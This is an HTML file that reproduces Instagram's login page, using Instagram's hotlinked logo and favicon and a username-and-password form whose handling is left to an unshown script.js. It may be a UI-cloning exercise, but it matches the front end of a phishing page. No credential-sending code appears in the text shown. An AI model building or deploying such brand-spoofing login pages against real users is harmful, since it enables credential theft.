<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login â€¢ Instagram</title>
    <link rel="icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="card">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo" class="logo">
            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" aria-label="Phone number, username, or email" aria-required="true" autocapitalize="off" required>
                <input type="password" id="password" placeholder="Password" aria-label="Password" aria-required="true" autocomplete="current-password" required>
                <button type="submit" id="loginBtn">Log in</button>
                <div class="divider">
                    <span>or</span>
                </div>
                <div class="facebook-login">
                    Log in with Facebook
                </div>
                <a href="#" class="forgot">Forgot password?</a>
            </form>
        </div>
        <div class="signup">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
